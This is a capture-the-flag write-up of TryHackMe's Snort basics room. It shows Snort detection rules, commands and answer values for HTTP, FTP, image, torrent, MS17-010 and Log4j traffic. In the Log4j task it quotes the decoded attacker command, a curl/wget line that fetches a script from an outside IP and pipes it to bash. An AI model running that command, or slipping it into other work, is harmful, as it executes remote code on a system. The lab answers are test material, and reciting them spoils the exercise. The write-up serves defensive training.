# Snort Challenge - The Basics" [here](https://tryhackme.com/room/snortchallenges1)


## Task 2: Writing IDS Rules (HTTP)

**Objective**: Detect TCP port 80 (HTTP) traffic in `mx-3.pcap` and analyze packet details.

**Directory**: `/home/ubuntu/Desktop/Exercise-Files/TASK-2 (HTTP)/`

**Steps**:
1. Navigated to the task directory:
   ```bash
   cd ~/Desktop/Exercise-Files/TASK-2\ \(HTTP\)/
   ls
   ```
   - Files: `mx-3.pcap`, `local.rules`
2. Edited `local.rules`:
   ```bash
   sudo nano local.rules
   ```
3. Wrote a rule to detect all TCP packets to/from port 80:
   ```text
   alert tcp any any <> any 80 (msg:"TCP port 80 traffic detected"; sid:1000001; rev:1;)
   ```
4. Ran Snort:
   ```bash
   sudo snort -c local.rules -A full -l . -r mx-3.pcap
   ```
5. Checked "Action Stats" for detected packets: **164 packets** [].
6. Analyzed specific packets:
   ```bash
   sudo snort -r snort.log.<timestamp> -X -n 65
   ```
   - Scrolled to packets 62, 63, 64, and 65 for details.

**Answers** (per your input):
- **Number of detected packets**: 164
- **Destination address of packet 63**: `216.239.59.99`
- **ACK number of packet 64**: `0x2E6B5384`
- **SEQ number of packet 62**: `0x36C21E28`
- **TTL of packet 65**: `128`
- **Source IP of packet 65**: `145.254.160.237`
- **Source port of packet 65**: `3372`

---

## Task 3: Writing IDS Rules (FTP)

**Objective**: Detect TCP port 21 (FTP) traffic, identify the FTP service name, and detect login attempts in `ftp-png-gif.pcap`.

**Directory**: `/home/ubuntu/Desktop/Exercise-Files/TASK-3 (ftp)/`

**Steps**:
1. Navigated to the task directory:
   ```bash
   cd ~/Desktop/Exercise-Files/TASK-3\ \(ftp\)/
   ls
   ```
   - Files: `ftp-png-gif.pcap`, `local.rules`
2. Cleared previous logs:
   ```bash
   sudo rm alert snort.log.*
   ```
3. Wrote a rule for all TCP port 21 traffic:
   ```text
   alert tcp any any <> any 21 (msg:"FTP traffic detected"; sid:1000001; rev:1;)
   ```
4. Ran Snort:
   ```bash
   sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap
   ```
5. Checked "Action Stats": **307 packets** [].
6. Found the FTP service name (code 220) in the first 10 packets:
   ```bash
   sudo snort -r snort.log.<timestamp> -X -n 10 | grep -A1 '220'
   ```
   - Service name: `Microsoft FTP Service` [].
7. Cleared logs and commented out the rule:
   ```bash
   sudo rm alert snort.log.*
   sudo nano local.rules
   #alert tcp any any <> any 21 (msg:"FTP traffic detected"; sid:1000001; rev:1;)
   ```
8. Wrote a rule for failed FTP logins (code 530):
   ```text
   alert tcp any any <> any any (msg:"Failed FTP Login"; content:"530"; nocase; sid:1000002; rev:1;)
   ```
9. Ran Snort: **41 packets** [].
10. Cleared logs and commented out the rule:
    ```bash
    sudo rm alert snort.log.*
    #alert tcp any any <> any any (msg:"Failed FTP Login"; content:"530"; nocase; sid:1000002; rev:1;)
    ```
11. Wrote a rule for successful FTP logins (code 230):
    ```text
    alert tcp any any <> any any (msg:"Successful FTP Login"; content:"230"; nocase; sid:1000003; rev:1;)
    ```
12. Ran Snort: **1 packet** [].
13. Cleared logs and commented out the rule:
    ```bash
    sudo rm alert snort.log.*
    #alert tcp any any <> any any (msg:"Successful FTP Login"; content:"230"; nocase; sid:1000003; rev:1;)
    ```
14. Wrote a rule for valid username, no password (code 331):
    ```text
    alert tcp any any <> any any (msg:"FTP Valid Username, No Password"; content:"331"; nocase; sid:1000004; rev:1;)
    ```
15. Ran Snort: **42 packets** [].
16. Cleared logs and commented out the rule:
    ```bash
    sudo rm alert snort.log.*
    #alert tcp any any <> any any (msg:"FTP Valid Username, No Password"; content:"331"; nocase; sid:1000004; rev:1;)
    ```
17. Wrote a rule for “Administrator” username, no password (code 331 with “USER Administrator”):
    ```text
    alert tcp any any <> any any (msg:"FTP Administrator Username, No Password"; content:"USER Administrator"; nocase; content:"331"; nocase; sid:1000005; rev:1;)
    ```
18. Ran Snort: **7 packets** [].

**Answers** (per your input):
- **Number of FTP packets**: 307
- **FTP service name**: `Microsoft FTP Service`
- **Failed FTP login packets**: 41
- **Successful FTP login packets**: 1
- **Valid username, no password packets**: 42
- **Administrator username, no password packets**: 7

---

## Task 4: Writing IDS Rules (PNG and GIF)

**Objective**: Detect PNG and GIF files in `ftp-png-gif.pcap` and identify embedded software/format.

**Directory**: `/home/ubuntu/Desktop/Exercise-Files/TASK-4 (PNG-GIF)/`

**Steps**:
1. Navigated to the task directory:
   ```bash
   cd ~/Desktop/Exercise-Files/TASK-4\ \(PNG-GIF\)/
   ls
   ```
   - Files: `ftp-png-gif.pcap`, `local.rules`
2. Wrote a rule for PNG files (magic number `89 50 4E 47 0D 0A 1A 0A`):
   ```text
   alert tcp any any <> any any (msg:"PNG file detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:1000006; rev:1;)
   ```
3. Ran Snort:
   ```bash
   sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap
   ```
4. Extracted software name from the log:
   ```bash
   strings snort.log.<timestamp> | grep -i adobe
   ```
   - Software name: `Adobe ImageReady` [].
5. Cleared logs and commented out the rule:
   ```bash
   sudo rm alert snort.log.*
   #alert tcp any any <> any any (msg:"PNG file detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:1000006; rev:1;)
   ```
6. Wrote a rule for GIF files (`GIF89a`):
   ```text
   alert tcp any any <> any any (msg:"GIF89a file detected"; content:"|47 49 46 38 39 61|"; sid:1000007; rev:1;)
   ```
7. Ran Snort and checked the log:
   ```bash
   strings snort.log.<timestamp> | grep -i GIF
   ```
   - Image format: `GIF89a` [].

**Answers** (per your input):
- **PNG software name**: `Adobe ImageReady`
- **GIF image format**: `GIF89a`

---

## Task 5: Writing IDS Rules (Torrent Metafiles)

**Objective**: Detect torrent metafiles in `ftp-png-gif.pcap` and identify application, MIME type, and hostname.

**Directory**: `/home/ubuntu/Desktop/Exercise-Files/TASK-5 (Torrent)/`

**Steps**:
1. Navigated to the task directory:
   ```bash
   cd ~/Desktop/Exercise-Files/TASK-5\ \(Torrent\)/
   ls
   ```
   - Files: `ftp-png-gif.pcap`, `local.rules`
2. Wrote a rule to detect `.torrent` files:
   ```text
   alert tcp any any <> any any (msg:"Torrent file detected"; content:".torrent"; nocase; sid:1000008; rev:1;)
   ```
3. Ran Snort:
   ```bash
   sudo snort -c local.rules -A full -l . -r ftp-png-gif.pcap
   ```
4. Checked "Action Stats": **2 packets** [].
5. Analyzed the log for application name, MIME type, and hostname:
   ```bash
   strings snort.log.<timestamp> | grep -i bittorrent
   sudo snort -r snort.log.<timestamp> -X | less
   ```
   - Application name: `bittorrent` (corrected typo from your input) [].
   - MIME type: `application/x-bittorrent` (corrected typo) [].
   - Hostname: `tracker2.torrentbox.com` [].

**Answers** (per your input, with typo corrections):
- **Number of torrent packets**: 2
- **Torrent application name**: `bittorrent`
- **MIME type**: `application/x-bittorrent`
- **Hostname**: `tracker2.torrentbox.com`

---

## Task 6: Troubleshooting Rule Syntax Errors

**Objective**: Fix syntax errors in `local-1.rules` to `local-7.rules` using `mx-1.pcap`.

**Directory**: `/home/ubuntu/Desktop/Exercise-Files/TASK-6 (Troubleshooting)/`

**Steps**:
1. Navigated to the task directory:
   ```bash
   cd ~/Desktop/Exercise-Files/TASK-6\ \(Troubleshooting\)/
   ls
   ```
   - Files: `local-1.rules` to `local-7.rules`, `mx-1.pcap`
2. Tested each rule:
   ```bash
   sudo snort -c local-X.rules -r mx-1.pcap -A console
   ```
3. Fixed and answered:
   - **local-1.rules**: Removed invalid `<-`:
     ```text
     alert icmp any any -> any any (msg:"ICMP Packet Found"; sid:1000001; rev:1;)
     ```
     - Packets: **16** [].
   - **local-2.rules**: Corrected port syntax for HTTP/HTTPS:
     ```text
     alert tcp any any -> any 80,443 (msg:"HTTPX Packet Found"; sid:1000002; rev:1;)
     ```
     - Packets: **68** [].
   - **local-3.rules**: Fixed duplicate SIDs:
     ```text
     alert icmp any any -> any any (msg:"ICMP Packet Found"; sid:1000001; rev:1;)
     alert icmp any any -> any any (msg:"Inbound ICMP Packet Found"; sid:1000003; rev:1;)
     ```
     - Packets: **87** [].
   - **local-4.rules**: Corrected missing semicolon:
     ```text
     alert tcp any any -> any 22 (msg:"SSH Packet Found"; sid:1000004; rev:1;)
     ```
     - Packets: **90** [].
   - **local-5.rules**: Fixed invalid protocol:
     ```text
     alert udp any any -> any 53 (msg:"DNS Packet Found"; sid:1000005; rev:1;)
     ```
     - Packets: **155** [].
   - **local-6.rules**: Added `nocase` for case-insensitive GET:
     ```text
     alert tcp any any <> any 80 (msg:"GET Request Found"; content:"GET"; nocase; sid:1000006; rev:1;)
     ```
     - Packets: **2** [].
   - **local-7.rules**: Added `msg` option for clarity:
     ```text
     alert tcp any any -> any 445 (msg:"SMB Packet Found"; sid:1000007; rev:1;)
     ```
     - Required option: `msg` [].

**Answers** (per your input):
- **local-1.rules packets**: 16
- **local-2.rules packets**: 68
- **local-3.rules packets**: 87
- **local-4.rules packets**: 90
- **local-5.rules packets**: 155
- **local-6.rules packets**: 2
- **local-7.rules required option**: `msg`

---

## Task 7: Using External Rules (MS17-010)

**Objective**: Investigate MS17-010 exploitation in a PCAP using provided and custom rules.

**Directory**: `/home/ubuntu/Desktop/Exercise-Files/TASK-7 (MS17-010)/`

**Steps**:
1. Navigated to the task directory:
   ```bash
   cd ~/Desktop/Exercise-Files/TASK-7\ \(MS17-010\)/
   ls
   ```
   - Files: `ms17-010.pcap`, `local.rules`, `local-1.rules`
2. Ran Snort with `local.rules`:
   ```bash
   sudo snort -c local.rules -A full -l . -r ms17-010.pcap
   ```
3. Checked "Action Stats": **25154 packets** [].
4. Cleared logs:
   ```bash
   sudo rm alert snort.log.*
   ```
5. Wrote a rule in `local-1.rules` for `\IPC$`:
   ```text
   alert tcp any any <> any any (msg:"IPC$ Payload Detected"; content:"|5c 49 50 43 24|"; sid:1000009; rev:1;)
   ```
6. Ran Snort: **12 packets** [].
7. Analyzed the log for the requested path:
   ```bash
   strings snort.log.<timestamp> | grep -i IPC
   ```
   - Path: `\\192.168.116.138\IPC$` [].
8. Searched NIST for CVSS v2 score of MS17-010: **9.3** [].

**Answers** (per your input):
- **Number of detected packets (local.rules)**: 25154
- **Number of detected packets (\IPC$)**: 12
- **Requested path**: `\\192.168.116.138\IPC$`
- **CVSS v2 score**: 9.3

---

## Task 8: Using External Rules (Log4j)

**Objective**: Investigate Log4j exploitation in a PCAP and detect specific payloads.

**Directory**: `/home/ubuntu/Desktop/Exercise-Files/TASK-8 (Log4j)/`

**Steps**:
1. Navigated to the task directory:
   ```bash
   cd ~/Desktop/Exercise-Files/TASK-8\ \(Log4j\)/
   ls
   ```
   - Files: `log4j.pcap`, `local.rules`, `local-1.rules`
2. Ran Snort with `local.rules`:
   ```bash
   sudo snort -c local.rules -A full -l . -r log4j.pcap
   ```
3. Checked "Action Stats": **26 packets** [].
4. Counted unique SIDs in `alert`:
   ```bash
   cat alert | grep -o "sid:[0-9]*" | sort -u | wc -l
   ```
   - Rules triggered: **4** [].
5. Extracted first six digits of SIDs:
   ```bash
   cat alert | grep -o "sid:[0-9]*" | sort -u
   ```
   - First six digits: `210037` (from one SID) [].
6. Cleared logs:
   ```bash
   sudo rm alert snort.log.*
   ```
7. Wrote a rule in `local-1.rules` for payloads between 770 and 855 bytes:
   ```text
   alert tcp any any <> any any (msg:"Payload 770-855 Bytes"; dsize:770<>855; sid:1000010; rev:1;)
   ```
8. Ran Snort: **41 packets** [].
9. Analyzed the log for encoding algorithm:
   ```bash
   sudo snort -r snort.log.<timestamp> -X | less
   ```
   - Encoding algorithm: `base64` [].
10. Decoded the command using CyberChef (Base64):
    ```bash
    strings snort.log.<timestamp> | grep -i jndi
    ```
    - Command: `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash` [].
11. Searched NIST for CVSS v2 score of Log4j (CVE-2021-44228): **9.3** 

**Answers** :
- **Number of detected packets**: 26
- **Number of rules triggered**: 4
- **First six digits of SIDs**: `210037`
- **Number of detected packets (770-855 bytes)**: 41
- **Encoding algorithm**: `base64`
- **Attacker’s command**: `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`
- **CVSS v2 score**: 9.3  

---


